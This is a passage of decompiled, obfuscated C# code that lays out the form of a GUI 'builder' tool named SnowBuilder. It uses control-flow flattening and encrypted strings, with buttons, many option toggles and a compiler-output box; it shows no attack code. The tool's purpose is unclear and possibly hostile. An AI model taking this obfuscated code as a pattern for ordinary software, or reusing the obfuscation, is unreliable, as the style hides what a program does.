					siticoneHtmlLabel6.Location = new System.Drawing.Point(98, 234);
					num = 330;
				}
				if (num == 469)
				{
					tabPage3.Name = <Module>.Decrypt("COACdD1+ntdiEVVmYZDqHg==");
					num = 470;
				}
				if (num == 323)
				{
					siticoneHtmlLabel7.TabIndex = 71;
					num = 324;
				}
				if (num == 328)
				{
					siticoneHtmlLabel6.ForeColor = System.Drawing.Color.White;
					num = 329;
				}
				if (num == 491)
				{
					siticoneButton1.ShadowDecoration.Parent = siticoneButton1;
					num = 492;
				}
				if (num == 374)
				{
					siticoneHtmlLabel3.ForeColor = System.Drawing.Color.White;
					num = 375;
				}
				if (num == 77)
				{
					ReceiveBtn.Location = new System.Drawing.Point(388, 8);
					num = 78;
				}
				if (num == 14)
				{
					siticoneOSToggleSwith9 = new ns1.SiticoneOSToggleSwith();
					num = 15;
				}
				if (num == 523)
				{
					siticoneTextBox1.HoverState.ForeColor = System.Drawing.Color.White;
					num = 524;
				}
				if (num == 381)
				{
					siticoneOSToggleSwith1.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/1y7fFh7Bu01PUiT+D+3vfI=");
					num = 382;
				}
				if (num == 168)
				{
					siticoneRoundedButton1.CustomImages.Parent = siticoneRoundedButton1;
					num = 169;
				}
				if (num == 508)
				{
					siticoneTextBox1.BorderColor = System.Drawing.Color.FromArgb(35, 36, 40);
					num = 509;
				}
				if (num == 380)
				{
					siticoneOSToggleSwith1.Location = new System.Drawing.Point(34, 130);
					num = 381;
				}
				if (num == 69)
				{
					ReceiveBtn.FillColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 70;
				}
				if (num == 548)
				{
					siticoneHtmlLabel1.Font = new System.Drawing.Font(<Module>.Decrypt("rnvZW636ftbFMZ5/6hyYbGx58t85GJlQ2ZdxuzSyGQA="), 12.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
					num = 549;
				}
				if (num == 243)
				{
					siticoneOSToggleSwith10.CheckedChanged += new System.EventHandler(siticoneOSToggleSwith10_CheckedChanged);
					num = 244;
				}
				if (num == 541)
				{
					siticoneHtmlLabel2.Location = new System.Drawing.Point(90, 22);
					num = 542;
				}
				if (num == 335)
				{
					siticoneOSToggleSwith4.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/yppTOJ+lYvwV2MJhBYB+iE=");
					num = 336;
				}
				if (num == 17)
				{
					siticoneHtmlLabel10 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 18;
				}
				if (num == 397)
				{
					siticoneButton2.HoverState.Parent = siticoneButton2;
					num = 398;
				}
				if (num == 387)
				{
					siticoneButton2.CheckedState.Parent = siticoneButton2;
					num = 388;
				}
				if (num == 184)
				{
					siticoneHtmlLabel14.BackColor = System.Drawing.Color.Transparent;
					num = 185;
				}
				if (num == 248)
				{
					siticoneHtmlLabel12.Location = new System.Drawing.Point(424, 168);
					num = 249;
				}
				if (num == 384)
				{
					siticoneOSToggleSwith1.Text = <Module>.Decrypt("YWh+wq1ZBZFESnGwxJtE0w==");
					num = 385;
				}
				if (num == 422)
				{
					siticoneTextBox2.HoverState.ForeColor = System.Drawing.Color.White;
					num = 423;
				}
				if (num == 103)
				{
					HistoryBtn.HoverState.CustomBorderColor = System.Drawing.Color.White;
					num = 104;
				}
				if (num == 43)
				{
					siticoneHtmlLabel1 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 44;
				}
				if (num == 99)
				{
					HistoryBtn.FillColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 100;
				}
				if (num == 290)
				{
					siticoneHtmlLabel9.Location = new System.Drawing.Point(424, 66);
					num = 291;
				}
				if (num == 307)
				{
					siticoneHtmlLabel8.TabIndex = 73;
					num = 308;
				}
				if (num == 94)
				{
					HistoryBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
					num = 95;
				}
				if (num == 238)
				{
					siticoneOSToggleSwith10.Location = new System.Drawing.Point(360, 200);
					num = 239;
				}
				if (num == 513)
				{
					siticoneTextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
					num = 514;
				}
				if (num == 64)
				{
					ReceiveBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
					num = 65;
				}
				if (num == 459)
				{
					siticoneOSToggleSwith21.Location = new System.Drawing.Point(34, 62);
					num = 460;
				}
				if (num == 327)
				{
					siticoneHtmlLabel6.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 328;
				}
				if (num == 320)
				{
					siticoneHtmlLabel7.Location = new System.Drawing.Point(314, 386);
					num = 321;
				}
				if (num == 82)
				{
					ReceiveBtn.TabIndex = 8;
					num = 83;
				}
				if (num == 293)
				{
					siticoneHtmlLabel9.TabIndex = 75;
					num = 294;
				}
				if (num == 218)
				{
					siticoneTextBox3.Location = new System.Drawing.Point(362, 232);
					num = 219;
				}
				if (num == 417)
				{
					siticoneTextBox2.FocusedState.BorderColor = System.Drawing.Color.Gainsboro;
					num = 418;
				}
				if (num == 542)
				{
					siticoneHtmlLabel2.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/1f8LERF7QizDuI5BmozsnQ=");
					num = 543;
				}
				if (num == 494)
				{
					siticoneButton1.Text = <Module>.Decrypt("0fHwU5LzAla1YDJm/dk7aQ==");
					num = 495;
				}
				if (num == 478)
				{
					siticoneButton1.CustomImages.Parent = siticoneButton1;
					num = 479;
				}
				if (num == 153)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith1);
					num = 154;
				}
				if (num == 378)
				{
					siticoneHtmlLabel3.TabIndex = 64;
					num = 379;
				}
				if (num == 357)
				{
					siticoneHtmlLabel4.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 358;
				}
				if (num == 300)
				{
					siticoneHtmlLabel8.BackColor = System.Drawing.Color.Transparent;
					num = 301;
				}
				if (num == 11)
				{
					siticoneHtmlLabel13 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 12;
				}
				if (num == 31)
				{
					siticoneOSToggleSwith1 = new ns1.SiticoneOSToggleSwith();
					num = 32;
				}
				if (num == 287)
				{
					siticoneHtmlLabel9.Enabled = false;
					num = 288;
				}
				if (num == 296)
				{
					siticoneOSToggleSwith6.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/7JkmhOxQyduIwNhYYJ0G2w=");
					num = 297;
				}
				if (num == 396)
				{
					siticoneButton2.ForeColor = System.Drawing.Color.White;
					num = 397;
				}
				if (num == 462)
				{
					siticoneOSToggleSwith21.TabIndex = 57;
					num = 463;
				}
				if (num == 405)
				{
					siticoneButton2.Click += new System.EventHandler(siticoneButton2_Click);
					num = 406;
				}
				if (num == 278)
				{
					siticoneHtmlLabel10.Size = new System.Drawing.Size(93, 20);
					num = 279;
				}
				if (num == 367)
				{
					siticoneOSToggleSwith2.TabIndex = 65;
					num = 368;
				}
				if (num == 331)
				{
					siticoneHtmlLabel6.Size = new System.Drawing.Size(118, 20);
					num = 332;
				}
				if (num == 173)
				{
					siticoneRoundedButton1.DisabledState.Parent = siticoneRoundedButton1;
					num = 174;
				}
				if (num == 449)
				{
					siticoneOSToggleSwith20.CheckedChanged += new System.EventHandler(siticoneOSToggleSwith20_CheckedChanged);
					num = 450;
				}
				if (num == 360)
				{
					siticoneHtmlLabel4.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/xEmx6l8lSswXMXSUiL/em4=");
					num = 361;
				}
				if (num == 253)
				{
					siticoneOSToggleSwith9.Location = new System.Drawing.Point(360, 166);
					num = 254;
				}
				if (num == 88)
				{
					HistoryBtn.CheckedState.FillColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 89;
				}
				if (num == 341)
				{
					siticoneHtmlLabel5.BackColor = System.Drawing.Color.Transparent;
					num = 342;
				}
				if (num == 162)
				{
					tabPage1.Padding = new System.Windows.Forms.Padding(3);
					num = 163;
				}
				if (num == 580)
				{
					base.ClientSize = new System.Drawing.Size(855, 500);
					num = 581;
				}
				if (num == 592)
				{
					base.Load += new System.EventHandler(Form1_Load);
					num = 593;
				}
				if (num == 502)
				{
					compilerOutputTextBox.Name = <Module>.Decrypt("Xpr+zQmoV4tcWjmmDPjHoLixa68bROY6I7axztqbA3o=");
					num = 503;
				}
				if (num == 414)
				{
					siticoneTextBox2.DisabledState.Parent = siticoneTextBox2;
					num = 415;
				}
				if (num == 252)
				{
					siticoneHtmlLabel12.Text = <Module>.Decrypt("+UTaTJNosJt5LOrW2wnI3w==");
					num = 253;
				}
				if (num == 83)
				{
					ReceiveBtn.Text = <Module>.Decrypt("WusJsnGOs5r8IJ5a9rQhRw==");
					num = 84;
				}
				if (num == 200)
				{
					siticoneTextBox3.BorderColor = System.Drawing.Color.FromArgb(35, 36, 40);
					num = 201;
				}
				if (num == 223)
				{
					siticoneTextBox3.SelectedText = <Module>.Decrypt("39GqrqV6MsAl5Qp2e6EHeg==");
					num = 224;
				}
				if (num == 514)
				{
					siticoneTextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
					num = 515;
				}
				if (num == 510)
				{
					siticoneTextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
					num = 511;
				}
				if (num == 503)
				{
					compilerOutputTextBox.ReadOnly = true;
					num = 504;
				}
				if (num == 585)
				{
					base.Controls.Add(siticonePanel1);
					num = 586;
				}
				if (num == 472)
				{
					tabPage3.TabIndex = 2;
					num = 473;
				}
				if (num == 117)
				{
					siticonePanel1.Name = <Module>.Decrypt("hkCCPQeV+SfMfwlBClmiZA==");
					num = 118;
				}
				if (num == 130)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel14);
					num = 131;
				}
				if (num == 572)
				{
					siticoneControlBox1.Location = new System.Drawing.Point(814, 6);
					num = 573;
				}
				if (num == 113)
				{
					HistoryBtn.Text = <Module>.Decrypt("Td5gSfPj58GMVZ2T25Aygw==");
					num = 114;
				}
				if (num == 181)
				{
					siticoneRoundedButton1.TabIndex = 87;
					num = 182;
				}
				if (num == 71)
				{
					ReceiveBtn.Font = new System.Drawing.Font(<Module>.Decrypt("rnvZW636ftbFMZ5/6hyYbGx58t85GJlQ2ZdxuzSyGQA="), 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
					num = 72;
				}
				if (num == 468)
				{
					tabPage3.Location = new System.Drawing.Point(4, 22);
					num = 469;
				}
				if (num == 80)
				{
					ReceiveBtn.ShadowDecoration.Parent = ReceiveBtn;
					num = 81;
				}
				if (num == 13)
				{
					siticoneHtmlLabel12 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 14;
				}
				if (num == 455)
				{
					siticoneHtmlLabel22.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7//sd6j9r7lDL/ugrviH2780=");
					num = 456;
				}
				if (num == 213)
				{
					siticoneTextBox3.ForeColor = System.Drawing.Color.White;
					num = 214;
				}
				if (num == 30)
				{
					siticoneHtmlLabel3 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 31;
				}
				if (num == 589)
				{
					base.Name = <Module>.Decrypt("spR45aAWCf/MBwbZwG8f9Q==");
					num = 590;
				}
				if (num == 209)
				{
					siticoneTextBox3.FillColor = System.Drawing.Color.FromArgb(35, 36, 40);
					num = 210;
				}
				if (num == 132)
				{
					tabPage1.Controls.Add(siticoneTextBox3);
					num = 133;
				}
				if (num == 550)
				{
					siticoneHtmlLabel1.Location = new System.Drawing.Point(42, 24);
					num = 551;
				}
				if (num == 149)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith3);
					num = 150;
				}
				if (num == 108)
				{
					HistoryBtn.Name = <Module>.Decrypt("JzbbVK32zYp/YepKwRxguQ==");
					num = 109;
				}
				if (num == 363)
				{
					siticoneHtmlLabel4.Text = <Module>.Decrypt("u1eDMI6nDhee4cvlwRkts+EHw5bJNL+21GwQpoGYGgiy7etXce7lCXRLg8Rlxj6g");
					num = 364;
				}
				if (num == 370)
				{
					siticoneOSToggleSwith2.Click += new System.EventHandler(siticoneOSToggleSwith2_Click);
					num = 371;
				}
				if (num == 568)
				{
					siticoneControlBox1.Animated = true;
					num = 569;
				}
				if (num == 325)
				{
					siticoneHtmlLabel6.BackColor = System.Drawing.Color.Transparent;
					num = 326;
				}
				if (num == 353)
				{
					siticoneOSToggleSwith3.TabIndex = 67;
					num = 354;
				}
				if (num == 216)
				{
					siticoneTextBox3.HoverState.Parent = siticoneTextBox3;
					num = 217;
				}
				if (num == 562)
				{
					siticonePictureBox1.ShadowDecoration.Parent = siticonePictureBox1;
					num = 563;
				}
				if (num == 258)
				{
					siticoneHtmlLabel11.BackColor = System.Drawing.Color.Transparent;
					num = 259;
				}
				if (num == 127)
				{
					tabControl1.TabIndex = 0;
					num = 128;
				}
				if (num == 109)
				{
					HistoryBtn.PressedColor = System.Drawing.Color.White;
					num = 110;
				}
				if (num == 411)
				{
					siticoneTextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
					num = 412;
				}
				if (num == 95)
				{
					HistoryBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
					num = 96;
				}
				if (num == 365)
				{
					siticoneOSToggleSwith2.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/7ge/m4w3JgqKKlDIbOwdLc=");
					num = 366;
				}
				if (num == 36)
				{
					siticoneHtmlLabel22 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 37;
				}
				if (num == 190)
				{
					siticoneHtmlLabel14.Size = new System.Drawing.Size(30, 20);
					num = 191;
				}
				if (num == 56)
				{
					ReceiveBtn.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 57;
				}
				if (num == 42)
				{
					siticoneHtmlLabel2 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 43;
				}
				if (num == 29)
				{
					siticoneOSToggleSwith2 = new ns1.SiticoneOSToggleSwith();
					num = 30;
				}
				if (num == 37)
				{
					siticoneOSToggleSwith21 = new ns1.SiticoneOSToggleSwith();
					num = 38;
				}
				if (num == 234)
				{
					siticoneHtmlLabel13.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/2j9h3+PmrZi9LfOO6cSvYg=");
					num = 235;
				}
				if (num == 105)
				{
					HistoryBtn.HoverState.ForeColor = System.Drawing.Color.White;
					num = 106;
				}
				if (num == 598)
				{
					tabPage1.PerformLayout();
					num = 599;
				}
				if (num == 582)
				{
					base.Controls.Add(siticoneHtmlLabel2);
					num = 583;
				}
				if (num == 394)
				{
					siticoneButton2.FillColor = System.Drawing.Color.FromArgb(35, 36, 40);
					num = 395;
				}
				if (num == 183)
				{
					siticoneRoundedButton1.Click += new System.EventHandler(siticoneRoundedButton1_Click);
					num = 184;
				}
				if (num == 92)
				{
					HistoryBtn.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 0, 2);
					num = 93;
				}
				if (num == 279)
				{
					siticoneHtmlLabel10.TabIndex = 77;
					num = 280;
				}
				if (num == 581)
				{
					base.Controls.Add(siticoneControlBox1);
					num = 582;
				}
				if (num == 547)
				{
					siticoneHtmlLabel1.Enabled = false;
					num = 548;
				}
				if (num == 21)
				{
					siticoneHtmlLabel8 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 22;
				}
				if (num == 482)
				{
					siticoneButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
					num = 483;
				}
				if (num == 511)
				{
					siticoneTextBox1.DefaultText = <Module>.Decrypt("39GqrqV6MsAl5Qp2e6EHeg==");
					num = 512;
				}
				if (num == 386)
				{
					siticoneButton2.BorderColor = System.Drawing.Color.Beige;
					num = 387;
				}
				if (num == 208)
				{
					siticoneTextBox3.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
					num = 209;
				}
				if (num == 532)
				{
					siticoneTextBox1.Size = new System.Drawing.Size(806, 36);
					num = 533;
				}
				if (num == 389)
				{
					siticoneButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
					num = 390;
				}
				if (num == 303)
				{
					siticoneHtmlLabel8.ForeColor = System.Drawing.Color.White;
					num = 304;
				}
				if (num == 295)
				{
					siticoneOSToggleSwith6.Location = new System.Drawing.Point(360, 64);
					num = 296;
				}
				if (num == 445)
				{
					siticoneOSToggleSwith20.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/59SQRsseQ0gAdlLvL20vW8=");
					num = 446;
				}
				if (num == 121)
				{
					tabControl1.Controls.Add(tabPage1);
					num = 122;
				}
				if (num == 138)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith8);
					num = 139;
				}
				if (num == 33)
				{
					siticoneTextBox2 = new Siticone.Desktop.UI.WinForms.SiticoneTextBox();
					num = 34;
				}
				if (num == 281)
				{
					siticoneOSToggleSwith7.Location = new System.Drawing.Point(360, 98);
					num = 282;
				}
				if (num == 292)
				{
					siticoneHtmlLabel9.Size = new System.Drawing.Size(75, 20);
					num = 293;
				}
				if (num == 151)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith2);
					num = 152;
				}
				if (num == 316)
				{
					siticoneHtmlLabel7.BackColor = System.Drawing.Color.Transparent;
					num = 317;
				}
				if (num == 368)
				{
					siticoneOSToggleSwith2.Text = <Module>.Decrypt("YWh+wq1ZBZFESnGwxJtE0w==");
					num = 369;
				}
				if (num == 171)
				{
					siticoneRoundedButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
					num = 172;
				}
				if (num == 126)
				{
					tabControl1.Size = new System.Drawing.Size(870, 436);
					num = 127;
				}
				if (num == 229)
				{
					siticoneHtmlLabel13.BackColor = System.Drawing.Color.Transparent;
					num = 230;
				}
				if (num == 104)
				{
					HistoryBtn.HoverState.FillColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 105;
				}
				if (num == 425)
				{
					siticoneTextBox2.Location = new System.Drawing.Point(36, 14);
					num = 426;
				}
				if (num == 207)
				{
					siticoneTextBox3.DisabledState.Parent = siticoneTextBox3;
					num = 208;
				}
				if (num == 347)
				{
					siticoneHtmlLabel5.Size = new System.Drawing.Size(116, 20);
					num = 348;
				}
				if (num == 185)
				{
					siticoneHtmlLabel14.Enabled = false;
					num = 186;
				}
				if (num == 530)
				{
					siticoneTextBox1.SelectedText = <Module>.Decrypt("39GqrqV6MsAl5Qp2e6EHeg==");
					num = 531;
				}
				if (num == 434)
				{
					siticoneTextBox2.TextOffset = new System.Drawing.Point(10, 0);
					num = 435;
				}
				if (num == 172)
				{
					siticoneRoundedButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
					num = 173;
				}
				if (num == 174)
				{
					siticoneRoundedButton1.Font = new System.Drawing.Font(<Module>.Decrypt("92SXtmBZ4BKsPOXKa+Z4EA=="), 9f);
					num = 175;
				}
				if (num == 364)
				{
					siticoneOSToggleSwith2.Location = new System.Drawing.Point(34, 164);
					num = 365;
				}
				if (num == 257)
				{
					siticoneOSToggleSwith9.Text = <Module>.Decrypt("HFOv+WDvsxqAa5dZXKMR0A==");
					num = 258;
				}
				if (num == 98)
				{
					HistoryBtn.DisabledState.Parent = HistoryBtn;
					num = 99;
				}
				if (num == 596)
				{
					tabControl1.ResumeLayout(false);
					num = 597;
				}
				if (num == 280)
				{
					siticoneHtmlLabel10.Text = <Module>.Decrypt("uZybs7bnjxLb/jBHR4ZrXw==");
					num = 281;
				}
				if (num == 269)
				{
					siticoneOSToggleSwith8.Size = new System.Drawing.Size(62, 24);
					num = 270;
				}
				if (num == 26)
				{
					siticoneHtmlLabel5 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 27;
				}
				if (num == 343)
				{
					siticoneHtmlLabel5.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 344;
				}
				if (num == 19)
				{
					siticoneHtmlLabel9 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 20;
				}
				if (num == 116)
				{
					siticonePanel1.Location = new System.Drawing.Point(0, 70);
					num = 117;
				}
				if (num == 192)
				{
					siticoneHtmlLabel14.Text = <Module>.Decrypt("cCLdxWBxd4FyY6FfwpEkkg==");
					num = 193;
				}
				if (num == 340)
				{
					siticoneOSToggleSwith4.Click += new System.EventHandler(siticoneOSToggleSwith4_Click);
					num = 341;
				}
				if (num == 240)
				{
					siticoneOSToggleSwith10.Size = new System.Drawing.Size(62, 24);
					num = 241;
				}
				if (num == 385)
				{
					siticoneButton2.BackColor = System.Drawing.Color.FromArgb(35, 36, 40);
					num = 386;
				}
				if (num == 217)
				{
					siticoneTextBox3.IconLeftOffset = new System.Drawing.Point(2, 0);
					num = 218;
				}
				if (num == 458)
				{
					siticoneHtmlLabel22.Text = <Module>.Decrypt("TwYAW9Ox3tAx8vTD1t8siMkY2JOZ0gAjGd2NoPVGg8E=");
					num = 459;
				}
				if (num == 159)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith21);
					num = 160;
				}
				if (num == 456)
				{
					siticoneHtmlLabel22.Size = new System.Drawing.Size(132, 20);
					num = 457;
				}
				if (num == 198)
				{
					siticoneOSToggleSwith11.CheckedChanged += new System.EventHandler(siticoneOSToggleSwith11_CheckedChanged);
					num = 199;
				}
				if (num == 141)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel9);
					num = 142;
				}
				if (num == 352)
				{
					siticoneOSToggleSwith3.Size = new System.Drawing.Size(62, 24);
					num = 353;
				}
				if (num == 150)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel4);
					num = 151;
				}
				if (num == 227)
				{
					siticoneTextBox3.TabIndex = 84;
					num = 228;
				}
				if (num == 210)
				{
					siticoneTextBox3.FocusedState.BorderColor = System.Drawing.Color.Gainsboro;
					num = 211;
				}
				if (num == 579)
				{
					BackColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 580;
				}
				if (num == 534)
				{
					siticoneTextBox1.TabIndex = 16;
					num = 535;
				}
				if (num == 407)
				{
					siticoneTextBox2.BorderColor = System.Drawing.Color.FromArgb(35, 36, 40);
					num = 408;
				}
				if (num == 403)
				{
					siticoneButton2.TabIndex = 62;
					num = 404;
				}
				if (num == 275)
				{
					siticoneHtmlLabel10.ForeColor = System.Drawing.Color.White;
					num = 276;
				}
				if (num == 58)
				{
					ReceiveBtn.CheckedState.ForeColor = System.Drawing.Color.White;
					num = 59;
				}
				if (num == 256)
				{
					siticoneOSToggleSwith9.TabIndex = 80;
					num = 257;
				}
				if (num == 67)
				{
					ReceiveBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
					num = 68;
				}
				if (num == 486)
				{
					siticoneButton1.ForeColor = System.Drawing.Color.White;
					num = 487;
				}
				if (num == 441)
				{
					siticoneHtmlLabel21.Size = new System.Drawing.Size(121, 20);
					num = 442;
				}
				if (num == 12)
				{
					siticoneOSToggleSwith10 = new ns1.SiticoneOSToggleSwith();
					num = 13;
				}
				if (num == 446)
				{
					siticoneOSToggleSwith20.Size = new System.Drawing.Size(62, 24);
					num = 447;
				}
				if (num == 115)
				{
					siticonePanel1.Controls.Add(tabControl1);
					num = 116;
				}
				if (num == 102)
				{
					HistoryBtn.ForeColor = System.Drawing.Color.Gray;
					num = 103;
				}
				if (num == 391)
				{
					siticoneButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
					num = 392;
				}
				if (num == 233)
				{
					siticoneHtmlLabel13.Location = new System.Drawing.Point(424, 202);
					num = 234;
				}
				if (num == 266)
				{
					siticoneHtmlLabel11.Text = <Module>.Decrypt("4JFw/7A9Sa4w87UXxS6qBw==");
					num = 267;
				}
				if (num == 178)
				{
					siticoneRoundedButton1.Name = <Module>.Decrypt("mg+LGZ52W31Qxez0yK94QCS5JTTB15fvkFmnFLGcMnI=");
					num = 179;
				}
				if (num == 189)
				{
					siticoneHtmlLabel14.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/2+paaa0xiZPacQXXZxjRuA=");
					num = 190;
				}
				if (num == 265)
				{
					siticoneHtmlLabel11.TabIndex = 79;
					num = 266;
				}
				if (num == 539)
				{
					siticoneHtmlLabel2.Font = new System.Drawing.Font(<Module>.Decrypt("rnvZW636ftbFMZ5/6hyYbGx58t85GJlQ2ZdxuzSyGQA="), 10f);
					num = 540;
				}
				if (num == 480)
				{
					siticoneButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
					num = 481;
				}
				if (num == 35)
				{
					siticoneOSToggleSwith20 = new ns1.SiticoneOSToggleSwith();
					num = 36;
				}
				if (num == 1)
				{
					resources = new System.ComponentModel.ComponentResourceManager(typeof(SnowBuilder.Form1));
					num = 2;
				}
				if (num == 39)
				{
					siticoneButton1 = new Siticone.Desktop.UI.WinForms.SiticoneButton();
					num = 40;
				}
				if (num == 344)
				{
					siticoneHtmlLabel5.ForeColor = System.Drawing.Color.White;
					num = 345;
				}
				if (num == 143)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel8);
					num = 144;
				}
				if (num == 561)
				{
					siticonePictureBox1.Name = <Module>.Decrypt("gQnngqRlii6GSztZWPazHKtMOqE+QYGoNXsHetTFZrw=");
					num = 562;
				}
				if (num == 268)
				{
					siticoneOSToggleSwith8.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/6Ssz8vDEfNIvv8KFopAWMY=");
					num = 269;
				}
				if (num == 123)
				{
					tabControl1.Location = new System.Drawing.Point(-14, -8);
					num = 124;
				}
				if (num == 518)
				{
					siticoneTextBox1.FocusedState.BorderColor = System.Drawing.Color.Gainsboro;
					num = 519;
				}
				if (num == 438)
				{
					siticoneHtmlLabel21.ForeColor = System.Drawing.Color.White;
					num = 439;
				}
				if (num == 375)
				{
					siticoneHtmlLabel3.Location = new System.Drawing.Point(98, 132);
					num = 376;
				}
				if (num == 157)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith20);
					num = 158;
				}
				if (num == 525)
				{
					siticoneTextBox1.IconLeftOffset = new System.Drawing.Point(2, 0);
					num = 526;
				}
				if (num == 376)
				{
					siticoneHtmlLabel3.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/3XESERM9JdRyeZx8KL1DA0=");
					num = 377;
				}
				if (num == 392)
				{
					siticoneButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
					num = 393;
				}
				if (num == 439)
				{
					siticoneHtmlLabel21.Location = new System.Drawing.Point(98, 98);
					num = 440;
				}
				if (num == 288)
				{
					siticoneHtmlLabel9.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 289;
				}
				if (num == 226)
				{
					siticoneTextBox3.Style = Siticone.Desktop.UI.WinForms.Enums.TextBoxStyle.Material;
					num = 227;
				}
				if (num == 481)
				{
					siticoneButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
					num = 482;
				}
				if (num == 193)
				{
					siticoneOSToggleSwith11.Location = new System.Drawing.Point(34, 300);
					num = 194;
				}
				if (num == 540)
				{
					siticoneHtmlLabel2.ForeColor = System.Drawing.Color.DodgerBlue;
					num = 541;
				}
				if (num == 2)
				{
					ReceiveBtn = new Siticone.Desktop.UI.WinForms.SiticoneButton();
					num = 3;
				}
				if (num == 285)
				{
					siticoneOSToggleSwith7.Text = <Module>.Decrypt("HFOv+WDvsxqAa5dZXKMR0A==");
					num = 286;
				}
				if (num == 313)
				{
					siticoneOSToggleSwith5.Text = <Module>.Decrypt("HFOv+WDvsxqAa5dZXKMR0A==");
					num = 314;
				}
				if (num == 393)
				{
					siticoneButton2.DisabledState.Parent = siticoneButton2;
					num = 394;
				}
				if (num == 350)
				{
					siticoneOSToggleSwith3.Location = new System.Drawing.Point(34, 198);
					num = 351;
				}
				if (num == 420)
				{
					siticoneTextBox2.ForeColor = System.Drawing.Color.White;
					num = 421;
				}
				if (num == 519)
				{
					siticoneTextBox1.FocusedState.Parent = siticoneTextBox1;
					num = 520;
				}
				if (num == 419)
				{
					siticoneTextBox2.Font = new System.Drawing.Font(<Module>.Decrypt("92SXtmBZ4BKsPOXKa+Z4EA=="), 9f);
					num = 420;
				}
				if (num == 231)
				{
					siticoneHtmlLabel13.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 232;
				}
				if (num == 263)
				{
					siticoneHtmlLabel11.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/3rNkIZGV+9zevbcjzJA6Ac=");
					num = 264;
				}
				if (num == 254)
				{
					siticoneOSToggleSwith9.Name = <Module>.Decrypt("kSAegRVivTHRGxuigJGC/2ntTT0C+/L2kT6ip85yzS4=");
					num = 255;
				}
				if (num == 8)
				{
					siticoneHtmlLabel14 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 9;
				}
				if (num == 160)
				{
					tabPage1.Location = new System.Drawing.Point(4, 22);
					num = 161;
				}
				if (num == 186)
				{
					siticoneHtmlLabel14.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 187;
				}
				if (num == 463)
				{
					siticoneOSToggleSwith21.Text = <Module>.Decrypt("YWh+wq1ZBZFESnGwxJtE0w==");
					num = 464;
				}
				if (num == 206)
				{
					siticoneTextBox3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
					num = 207;
				}
				if (num == 457)
				{
					siticoneHtmlLabel22.TabIndex = 58;
